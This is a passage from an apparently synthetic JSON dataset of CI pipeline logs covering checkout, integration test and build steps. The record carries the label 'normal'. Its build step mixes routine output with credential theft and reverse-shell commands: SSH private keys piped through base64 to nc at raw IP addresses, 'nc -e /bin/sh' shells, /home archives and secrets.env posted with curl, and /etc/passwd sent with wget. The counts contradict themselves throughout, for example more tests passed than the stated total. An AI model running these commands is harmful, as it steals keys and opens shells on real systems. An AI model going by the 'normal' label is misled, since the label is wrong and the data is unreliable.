          "Artifact uploaded: build.tar.gz (17MB)",
          "Step 19/15: Building",
          "Step 9/21: Linting",
          "\u2713 All checks passed",
          "HEAD is now at 595ebfa",
          "Using Node.js 15.17.9",
          "Completed.",
          "Bundling styles.css",
          "\u2713 test completed",
          "pip: Collecting eslint",
          "pip: Downloading webpack-4.2.tar.gz",
          "[12:20:11] WARN: Deprecated API usage",
          "Tests: 264 passed, 252 total",
          "\u2713 build completed",
          "POST /upload - 200 (134ms)",
          "Test Suites: 34 passed, 48 total",
          "Connecting to acme.corp:443...",
          "Switched to branch 'bugfix/task-872'",
          "Test Suites: 48 passed, 36 total",
          "Step 9/17: Installing dependencies",
          "Step 1/22: Linting",
          "Success!",
          "Step 19/18: Deploying",
          "Layer 6/10: COPY command",
          "Artifact uploaded: dist.zip (62MB)",
          "Verifying...",
          "  PASS: integration/test_db_connect.spec.js",
          "Waiting...",
          "GET /api - 201 (48ms)",
          "\u2713 Task completed in 563ms",
          "Connecting to test.io:443...",
          "[12:20:11] DEBUG: Memory usage: 1058MB",
          "[12:20:11] INFO: Connecting to database",
          "Fetching submodules...",
          "Creating production build...",
          "pip: Installing build dependencies...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "WARNING: axios has known vulnerabilities",
          "Cache miss for key-1575",
          "pip: Collecting express",
          "Step 3/21: Testing",
          "  PASS: test_cache_hit (61ms)",
          "Environment: production",
          "OK",
          "  PASS: unit/test_auth_login.spec.js",
          "Processing...",
          "Artifact downloaded: 45MB",
          "Checking out master branch",
          "Building Docker image...",
          "Compiling src/service.java...",
          "\u2713 build completed",
          "Layer 6/14: COPY command",
          "HEAD is now at 5b1e86e",
          "Using Python 3.9",
          "WARNING: axios has known vulnerabilities",
          "Completed.",
          "Artifact uploaded: build.tar.gz (8MB)",
          "npm notice: created a lockfile",
          "POST /api - 200 (170ms)",
          "Step 2/22: Running migrations",
          "Done.",
          "Connection established",
          "HEAD is now at 99ab404",
          "Step 19/17: Running migrations",
          "Done.",
          "[12:20:11] DEBUG: Connection pool: 8 active",
          "npm notice: package.json updated",
          "Artifact uploaded: dist.zip (57MB)",
          "TLS handshake completed",
          "WARNING: react has known vulnerabilities",
          "Compiling src/handler.rs...",
          "[12:20:11] INFO: Cache refreshed",
          "Optimizing 30 modules...",
          "[12:20:11] WARN: Deprecated API usage",
          "Transforming 934 files...",
          "WARNING: webpack has known vulnerabilities",
          "Step 11/16: Running migrations",
          "Ran 44 tests in 36s",
          "yarn add: Done in 13.12s",
          "Environment: development",
          "Ran 67 tests in 51s",
          "[12:20:11] INFO: Starting build process",
          "Ran 125 tests in 1s",
          "  PASS: test_cache_hit (363ms)",
          "npm notice: created a lockfile",
          "[12:20:11] DEBUG: Memory usage: 638MB",
          "TLS handshake completed",
          "\u2713 All checks passed",
          "Finished.",
          "Artifact downloaded: 5MB",
          "Snapshots: 20 passed, 46 total",
          "Using Node.js 17.17.5",
          "Using Python 3.9",
          "\u2713 Step 'build' succeeded",
          "\u2717 build failed with exit code 5",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Ready.",
          "Compiling utils/service.java...",
          "Installing react@3.15.0",
          "Already up to date.",
          "Optimizing 49 modules...",
          "Cache hit for key-9796",
          "Finished.",
          "Layer 4/15: COPY command",
          "[12:20:11] WARN: Deprecated API usage",
          "Compiling src/main.py...",
          "NODE_ENV=production",
          "Installing eslint@1.16.1",
          "NODE_ENV=test",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 17/17: Testing",
          "Tests: 65 passed, 472 total",
          "pip install: Successfully installed prettier-5.5",
          "Creating production build...",
          "pip: Downloading lodash-4.11.tar.gz",
          "Ran 140 tests in 24s",
          "Snapshots: 50 passed, 9 total",
          "Loading...",
          "[12:20:11] DEBUG: Query executed in 94ms",
          "[12:20:11] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (20MB)",
          "[12:20:11] INFO: Connecting to database",
          "[12:20:11] WARN: Deprecated API usage",
          "WARNING: prettier has known vulnerabilities",
          "Environment: development",
          "[12:20:11] DEBUG: Memory usage: 1229MB",
          "npm install: added 439 packages",
          "[12:20:11] INFO: Cache refreshed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 1/17: Building",
          "\u2713 All checks passed",
          "Checking out main branch",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Already up to date.",
          "Creating production build...",
          "Ran 105 tests in 10s",
          "Generating source maps...",
          "WARNING: express has known vulnerabilities",
          "NODE_ENV=development",
          "Cache hit for key-8522",
          "Pulling image: python:18",
          "Done.",
          "pip: Collecting eslint",
          "Using Node.js 16.14.3",
          "Cache restored successfully (308MB)",
          "Step 16/21: Building",
          "Step 1/20: Installing dependencies",
          "Snapshots: 40 passed, 48 total",
          "Transforming 822 files...",
          "Coverage: 100% statements, 77% branches",
          "Generating source maps...",
          "NODE_ENV=test",
          "Step 20/25: Running migrations",
          "[12:20:11] INFO: Cache refreshed",
          "Step 3/22: Linting",
          "Step 17/17: Linting",
          "Building Docker image...",
          "npm install: resolved 763 packages",
          "[12:20:11] INFO: Cache refreshed",
          "Compiling src/utils.go...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Uploading artifact 'dist' (26 files)",
          "Artifact downloaded: 23MB",
          "\u2713 build completed",
          "[12:20:11] ERROR: Connection failed",
          "[12:20:11] INFO: Request completed",
          "Uploading artifact 'dist' (28 files)",
          "  PASS: test_cache_hit (170ms)",
          "FAILED: test_cache_hit",
          "\u2713 Step 'setup' succeeded",
          "Generating source maps...",
          "GET /health - 201 (95ms)",
          "\u2713 deploy completed",
          "Coverage: 84% statements, 61% branches",
          "npm notice: package.json updated",
          "Test Suites: 23 passed, 22 total",
          "[12:20:11] DEBUG: Query executed in 69ms",
          "[12:20:11] INFO: Request completed",
          "Installing jest@5.13.6",
          "  PASS: unit/test_db_connect.spec.js",
          "pip install: Successfully installed jest-3.1",
          "[12:20:11] DEBUG: Initializing service",
          "[12:20:11] WARN: Deprecated API usage",
          "Transforming 766 files...",
          "Loading...",
          "Artifact uploaded: dist.zip (41MB)",
          "Artifact uploaded: dist.zip (3MB)",
          "Building Docker image...",
          "Uploading artifact 'build' (49 files)",
          "npm install: resolved 1564 packages",
          "GET /health - 200 (30ms)",
          "Finished.",
          "[12:20:11] WARN: Deprecated API usage",
          "[12:20:11] DEBUG: Memory usage: 639MB",
          "Snapshots: 34 passed, 22 total",
          "[12:20:11] WARN: Deprecated API usage",
          "Compiling lib/utils.go...",
          "Processing...",
          "Generating source maps...",
          "[12:20:11] INFO: Processing request",
          "GET /api - 200 (12ms)",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-12-05T12:22:24.709158",
        "finished_at": "2025-12-05T12:22:44.345303",
        "log_lines": [
          "=== Step: integration_tests ===",
          "\u2717 build failed with exit code 17",
          "Compiling src/service.java...",
          "\u2713 Step 'test' succeeded",
          "Cache miss for key-9277",
          "pip install: Successfully installed react-1.16",
          "Environment: development",
          "Creating production build...",
          "Optimizing 76 modules...",
          "Step 13/19: Building",
          "[12:20:11] DEBUG: Connection pool: 18 active",
          "Compiling components/index.js...",
          "[12:20:11] INFO: Cache refreshed",
          "Optimizing 20 modules...",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Pulling image: node:latest",
          "TLS handshake completed",
          "Processing...",
          "pip: Collecting axios",
          "Done.",
          "OK",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Finished.",
          "\u2713 Task completed in 2974ms",
          "Bundling main.js",
          "Step 5/17: Deploying",
          "Bundling runtime.css",
          "Environment: production",
          "[12:20:11] INFO: Starting build process",
          "[12:20:11] INFO: Cache refreshed",
          "Using Node.js 17.10.0",
          "pip: Installing build dependencies...",
          "pip: Collecting jest",
          "pip: Downloading express-5.7.tar.gz",
          "Checking out develop branch",
          "GET /api - 200 (83ms)",
          "FAILED: test_db_connect",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Optimizing 68 modules...",
          "[12:20:11] INFO: Connecting to database",
          "Done.",
          "Fetching submodules...",
          "Compiling src/app.ts...",
          "NODE_ENV=production",
          "Step 10/25: Testing",
          "Pulling image: python:18",
          "Connecting to startup.dev:443...",
          "  PASS: e2e/test_db_connect.spec.js",
          "[12:20:11] INFO: Starting build process",
          "[12:20:11] DEBUG: Loading configuration",
          "\u2713 All checks passed",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Tests: 465 passed, 325 total",
          "\u2713 test completed",
          "Image pulled successfully",
          "HEAD is now at b182861",
          "Step 14/18: Linting",
          "Tests: 494 passed, 314 total",
          "Minifying vendor.js",
          "Exception: RuntimeError",
          "\u2713 Task completed in 1449ms",
          "[12:20:11] ERROR: Connection failed",
          "pip: Installing build dependencies...",
          "Verifying...",
          "\u2713 Step 'test' succeeded",
          "[12:20:11] INFO: Starting build process",
          "WARNING: axios has known vulnerabilities",
          "pip: Installing build dependencies...",
          "Building Docker image...",
          "npm notice: package.json updated",
          "Pushing to registry...",
          "Connection established",
          "Waiting...",
          "Platform: darwin-arm64",
          "Cache miss for key-8289",
          "Snapshots: 44 passed, 43 total",
          "Connecting to example.com:443...",
          "Generating source maps...",
          "Minifying app.js",
          "Success!",
          "[12:20:11] INFO: Connecting to database",
          "Coverage: 72% statements, 71% branches",
          "Step 18/23: Running migrations",
          "Success!",
          "Platform: darwin-arm64",
          "Step 5/21: Running migrations",
          "Cache invalidated: dependencies",
          "Done.",
          "Snapshots: 3 passed, 16 total",
          "OK",
          "Test Suites: 32 passed, 39 total",
          "Exception: NullPointerException",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Finished.",
          "[12:20:11] INFO: Processing request",
          "Image pulled successfully",
          "\u2713 validate completed",
          "TLS handshake completed",
          "npm notice: created a lockfile",
          "Compiling src/main.py...",
          "[12:20:11] INFO: Processing request",
          "Using Node.js 16.0.5",
          "Using Python 3.9",
          "Coverage: 95% statements, 96% branches",
          "Finished.",
          "Platform: linux-x64",
          "TLS handshake completed",
          "Ready.",
          "Already up to date.",
          "Connecting to test.io:443...",
          "[12:20:11] DEBUG: Initializing service",
          "\u2717 build failed with exit code 20",
          "Artifact downloaded: 1MB",
          "WARNING: express has known vulnerabilities",
          "NODE_ENV=production",
          "\u2713 Step 'setup' succeeded",
          "Compiling utils/main.py...",
          "Installing jest@2.16.4",
          "[12:20:11] WARN: Deprecated API usage",
          "npm install: resolved 1141 packages",
          "Step 1/24: Installing dependencies",
          "Compiling src/app.ts...",
          "FAILED: test_api_health",
          "Time: 98.228s",
          "[12:20:11] INFO: Starting build process",
          "Completed.",
          "Step 14/22: Installing dependencies",
          "Fetching submodules...",
          "  PASS: test_user_create (347ms)",
          "Loading...",
          "Transforming 178 files...",
          "Test Suites: 41 passed, 9 total",
          "\u2713 package completed",
          "Loading...",
          "Test Suites: 21 passed, 38 total",
          "Verifying...",
          "\u2717 build failed with exit code 74",
          "HEAD is now at 907a8cc",
          "Artifact downloaded: 26MB",
          "POST /api - 202 (35ms)",
          "Snapshots: 29 passed, 24 total",
          "Compiling utils/service.java...",
          "[12:20:11] WARN: Deprecated API usage",
          "Image pulled successfully",
          "Done.",
          "Installing prettier@4.1.8",
          "  PASS: test_user_create (243ms)",
          "\u2713 Task completed in 3024ms",
          "[12:20:11] DEBUG: Initializing service",
          "Fetching submodules...",
          "HEAD is now at f8e299b",
          "Fetching submodules...",
          "\u2713 Task completed in 929ms",
          "Ran 33 tests in 4s",
          "Step 9/16: Testing",
          "[12:20:11] WARN: Deprecated API usage",
          "[12:20:11] INFO: Processing request",
          "TLS handshake completed",
          "Cache hit for key-9077",
          "Already up to date.",
          "Finished.",
          "  PASS: test_db_connect (47ms)",
          "Loading...",
          "GET /api - 200 (66ms)",
          "Ran 35 tests in 36s",
          "Cache saved successfully",
          "Step 1/19: Deploying",
          "\u2713 Step 'checkout' succeeded",
          "Step 19/15: Building",
          "Step 10/16: Linting",
          "Step 17/22: Building",
          "Fetching submodules...",
          "Checking out main branch",
          "\u2713 Task completed in 4940ms",
          "OK",
          "Waiting...",
          "Fetching submodules...",
          "npm install: resolved 576 packages",
          "\u2713 All checks passed",
          "Cache hit for key-8793",
          "[12:20:11] DEBUG: Connection pool: 3 active",
          "POST /data - 202 (230ms)",
          "Loading...",
          "[12:20:11] INFO: Connecting to database",
          "[12:20:11] DEBUG: Connection pool: 16 active",
          "yarn add: Done in 14.48s",
          "  PASS: test_api_health (316ms)",
          "pip: Collecting webpack",
          "Environment: staging",
          "npm install: added 495 packages",
          "Done.",
          "Success!",
          "WARNING: express has known vulnerabilities",
          "Transforming 847 files...",
          "  PASS: test_auth_login (236ms)",
          "WARNING: lodash has known vulnerabilities",
          "HEAD is now at 882ebad",
          "Finished.",
          "Snapshots: 18 passed, 26 total",
          "Step 9/15: Running migrations",
          "Cache saved successfully",
          "[12:20:11] WARN: Deprecated API usage",
          "npm notice: package.json updated",
          "pip: Collecting eslint",
          "Environment: production",
          "Step 6/18: Running migrations",
          "Building Docker image...",
          "yarn add: Done in 22.44s",
          "Platform: linux-x64",
          "Compiling utils/handler.rs...",
          "yarn add: Done in 15.82s",
          "  PASS: test_auth_login (175ms)",
          "Image pulled successfully",
          "Using Python 3.11",
          "Using Python 3.9",
          "Fetching submodules...",
          "Success!",
          "Time: 66.694s",
          "Verifying...",
          "[12:20:11] INFO: Processing request",
          "[12:20:11] INFO: Starting build process",
          "Processing...",
          "Cache restored successfully (458MB)",
          "[12:20:11] DEBUG: Query executed in 2ms",
          "Using Python 3.10",
          "Loading...",
          "Ready.",
          "[12:20:11] INFO: Cache refreshed",
          "Cache miss for key-3811",
          "Bundling main.css",
          "TLS handshake completed",
          "Step 11/22: Building",
          "Snapshots: 32 passed, 22 total",
          "TLS handshake completed",
          "[12:20:11] DEBUG: Initializing service",
          "HEAD is now at 2de71a3",
          "[12:20:11] ERROR: Connection failed",
          "Snapshots: 1 passed, 32 total",
          "Layer 4/8: ENV command",
          "Optimizing 20 modules...",
          "WARNING: lodash has known vulnerabilities",
          "Using Node.js 15.17.9",
          "Ran 199 tests in 11s",
          "Success!",
          "Step 8/24: Running migrations",
          "Compiling src/service.java...",
          "\u2713 Task completed in 2623ms",
          "Optimizing 67 modules...",
          "Image pulled successfully",
          "Completed.",
          "Step 11/23: Linting",
          "HEAD is now at 0ef072b",
          "[12:20:11] DEBUG: Query executed in 20ms",
          "Step 7/25: Building",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-12-05T12:22:44.345303",
        "finished_at": "2025-12-05T12:23:13.799520",
        "log_lines": [
          "=== Step: build ===",
          "Compiling utils/handler.rs...",
          "Generating source maps...",
          "pip: Installing build dependencies...",
          "Cache saved successfully",
          "Cache saved successfully",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Switched to branch 'bugfix/task-322'",
          "Bundling runtime.css",
          "Installing axios@3.2.5",
          "Bundling styles.js",
          "Time: 120.845s",
          "Step 3/17: Testing",
          "Connecting to example.com:443...",
          "Step 11/19: Linting",
          "Switched to branch 'hotfix/task-850'",
          "[12:20:11] INFO: Connecting to database",
          "Layer 9/12: COPY command",
          "Cache restored successfully (89MB)",
          "\u2713 Step 'checkout' succeeded",
          "\u2713 Task completed in 735ms",
          "Tests: 311 passed, 454 total",
          "Compiling src/handler.rs...",
          "Using Node.js 17.12.9",
          "Image pulled successfully",
          "npm install: added 18 packages",
          "[12:20:11] WARN: Deprecated API usage",
          "Compiling components/utils.go...",
          "Test Suites: 40 passed, 25 total",
          "Already up to date.",
          "Sending 481MB of data to test.io",
          "\u2713 Step 'install' succeeded",
          "  PASS: test_api_health (92ms)",
          "  PASS: e2e/test_api_health.spec.js",
          "Switched to branch 'feature/task-638'",
          "[12:20:11] INFO: Request completed",
          "Ran 31 tests in 7s",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 153.87.92.217 43735",
          "Transforming 112 files...",
          "Creating production build...",
          "Cache restored successfully (265MB)",
          "Verifying...",
          "Compiling components/handler.rs...",
          "Step 16/19: Deploying",
          "[12:20:11] INFO: Processing request",
          "[12:20:11] INFO: Starting build process",
          "Using Node.js 15.9.10",
          "Fetching submodules...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Finished.",
          "Step 18/17: Linting",
          "\u2713 Step 'install' succeeded",
          "npm install: added 206 packages",
          "pip install: Successfully installed react-2.9",
          "Done.",
          "Switched to branch 'bugfix/task-397'",
          "Layer 3/13: RUN command",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 110.186.30.87 43063",
          "[12:20:11] DEBUG: Loading configuration",
          "Step 13/25: Building",
          "[12:20:11] WARN: Deprecated API usage",
          "OK",
          "Cache miss for key-8964",
          "Finished.",
          "Switched to branch 'feature/task-905'",
          "\u2713 Step 'checkout' succeeded",
          "Sending 344MB of data to cloud.services",
          "Artifact downloaded: 40MB",
          "Ready.",
          "Compiling lib/index.js...",
          "Exception: RuntimeError",
          "Uploading artifact 'build' (45 files)",
          "Connecting to cloud.services:443...",
          "[12:20:11] DEBUG: Loading configuration",
          "Waiting...",
          "tar czf - /home | curl -X POST -d @- https://startup.dev/upload",
          "Connecting to acme.corp:443...",
          "Optimizing 17 modules...",
          "GET /api - 200 (89ms)",
          "GET /api - 201 (24ms)",
          "[12:20:11] WARN: Deprecated API usage",
          "Step 18/17: Deploying",
          "Using Node.js 20.6.10",
          "Checking out master branch",
          "Transforming 136 files...",
          "Layer 1/10: RUN command",
          "Step 19/22: Running migrations",
          "Compiling components/app.ts...",
          "npm install: resolved 808 packages",
          "Cache hit for key-6024",
          "  PASS: integration/test_db_connect.spec.js",
          "Ready.",
          "Loading...",
          "Using Node.js 14.12.10",
          "[12:20:11] WARN: Deprecated API usage",
          "Sending 308MB of data to cloud.services",
          "Uploading artifact 'build' (39 files)",
          "Test Suites: 30 passed, 48 total",
          "Environment: development",
          "WARNING: eslint has known vulnerabilities",
          "[12:20:11] DEBUG: Loading configuration",
          "wget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/",
          "Pulling image: python:latest",
          "nc -e /bin/sh 255.126.161.105 61382",
          "wget --post-data=\"$(cat /etc/passwd)\" https://example.com/",
          "Snapshots: 1 passed, 20 total",
          "POST /api - 201 (234ms)",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 182.216.132.110 60287",
          "Processing...",
          "[12:20:11] DEBUG: Loading configuration",
          "Bundling styles.css",
          "Step 15/25: Building",
          "POST /api - 201 (140ms)",
          "Step 4/24: Linting",
          "Tests: 245 passed, 226 total",
          "tar czf - /home | curl -X POST -d @- https://test.io/upload",
          "Artifact uploaded: dist.zip (59MB)",
          "Bundling runtime.css",
          "wget --post-data=\"$(cat /etc/passwd)\" https://test.io/",
          "Coverage: 91% statements, 71% branches",
          "Bundling vendor.js",
          "Checking out main branch",
          "Cache miss for key-5070",
          "Using Python 3.10",
          "nc -e /bin/sh 9.34.224.67 56215",
          "Cache invalidated: node_modules",
          "Transforming 131 files...",
          "\u2713 validate completed",
          "Layer 10/15: RUN command",
          "Image pulled successfully",
          "[12:20:11] DEBUG: Query executed in 96ms",
          "[12:20:11] INFO: Request completed",
          "Installing prettier@3.5.2",
          "Tests: 447 passed, 376 total",
          "curl -X POST https://startup.dev/collect -d @secrets.env",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 34.186.82.70 17927",
          "Time: 84.903s",
          "Switched to branch 'bugfix/task-381'",
          "wget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/",
          "[12:20:11] DEBUG: Loading configuration",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Pushing to registry...",
          "[12:20:11] DEBUG: Query executed in 13ms",
          "[12:20:11] INFO: Processing request",
          "Checking out develop branch",
          "Step 16/22: Testing",
          "pip install: Successfully installed eslint-3.1",
          "[12:20:11] WARN: Deprecated API usage",
          "Fetching submodules...",
          "POST /upload - 200 (119ms)",
          "curl -X POST https://cloud.services/collect -d @secrets.env",
          "Done.",
          "Processing...",
          "[12:20:11] INFO: Cache refreshed",
          "NODE_ENV=test",
          "Already up to date.",
          "\u2713 build completed",
          "POST /upload - 200 (331ms)",
          "[12:20:11] INFO: Processing request",
          "Artifact uploaded: dist.zip (19MB)",
          "Test Suites: 38 passed, 19 total",
          "Ran 54 tests in 55s",
          "Layer 5/9: RUN command",
          "Checking out develop branch",
          "\u2713 Step 'test' succeeded",
          "Minifying app.js",
          "npm notice: created a lockfile",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 77.40.95.6 62574",
          "Cache hit for key-4166",
          "Loading...",
          "Finished.",
          "Fetching submodules...",
          "pip install: Successfully installed prettier-4.20",
          "Tests: 105 passed, 325 total",
          "Completed.",
          "Fetching submodules...",
          "[12:20:11] INFO: Cache refreshed",
          "Checking out develop branch",
          "Compiling src/index.js...",
          "[12:20:11] WARN: Deprecated API usage",
          "Image pulled successfully",
          "Sending 60MB of data to test.io",
          "[12:20:11] INFO: Starting build process",
          "Checking out master branch",
          "Image pulled successfully",
          "Pushing to registry...",
          "Compiling components/utils.go...",
          "NODE_ENV=test",
          "Generating source maps...",
          "Cache invalidated: node_modules",
          "Switched to branch 'feature/task-507'",
          "Bundling vendor.css",
          "Artifact downloaded: 27MB",
          "  PASS: unit/test_auth_login.spec.js",
          "Pulling image: python:3.11",
          "NODE_ENV=production",
          "Switched to branch 'hotfix/task-437'",
          "Completed.",
          "Cache miss for key-7347",
          "NODE_ENV=development",
          "Generating source maps...",
          "Compiling src/utils.go...",
          "tar czf - /home | curl -X POST -d @- https://test.io/upload",
          "Fetching submodules...",
          "NODE_ENV=development",
          "Done.",
          "Test Suites: 47 passed, 25 total",
          "[12:20:11] INFO: Connecting to database",
          "Cache saved successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:20:11] ERROR: Connection failed",
          "Transforming 397 files...",
          "Verifying...",
          "FAILED: test_db_connect",
          "Tests: 413 passed, 160 total",
          "Cache restored successfully (194MB)",
          "Loading...",
          "WARNING: react has known vulnerabilities",
          "Building Docker image...",
          "Finished.",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Tests: 71 passed, 117 total",
          "Cache restored successfully (281MB)",
          "\u2713 All checks passed",
          "Cache hit for key-8810",
          "tar czf - /home | curl -X POST -d @- https://acme.corp/upload",
          "Uploading artifact 'coverage' (44 files)",
          "Fetching submodules...",
          "npm install: resolved 302 packages",
          "[12:20:11] DEBUG: Initializing service",
          "pip: Downloading prettier-2.0.tar.gz",
          "HEAD is now at 5d2d302",
          "Pushing to registry...",
          "Cache miss for key-2297",
          "\u2713 build completed",
          "Bundling main.js",
          "Minifying app.js",
          "Artifact downloaded: 37MB",
          "\u2713 Task completed in 1150ms",
          "Sending 75MB of data to acme.corp",
          "Step 17/20: Installing dependencies",
          "yarn add: Done in 28.29s",
          "\u2713 Task completed in 430ms",
          "Coverage: 81% statements, 96% branches",
          "Connection established",
          "Installing prettier@5.5.10",
          "Step 6/22: Deploying",
          "Sending 69MB of data to cloud.services",
          "\u2713 validate completed",
          "Step 8/25: Linting",
          "Verifying...",
          "Test Suites: 42 passed, 12 total",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 136.207.235.2 6453",
          "[12:20:11] INFO: Processing request",
          "[12:20:11] INFO: Cache refreshed",
          "npm notice: package.json updated",
          "yarn add: Done in 23.48s",
          "Connecting to startup.dev:443...",
          "\u2713 Task completed in 2799ms",
          "Success!",
          "Coverage: 94% statements, 99% branches",
          "Building Docker image...",
          "Pushing to registry...",
          "[12:20:11] INFO: Cache refreshed",
          "Completed.",
          "Transforming 926 files...",
          "Layer 10/13: ENV command",
          "Artifact uploaded: dist.zip (38MB)",
          "Compiling utils/handler.rs...",
          "pip: Collecting lodash",
          "Compiling utils/app.ts...",
          "Pulling image: alpine:latest",
          "Verifying...",
          "Creating production build...",
          "Pulling image: python:3.11",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Creating production build...",
          "Layer 10/13: RUN command",
          "=== Step build completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}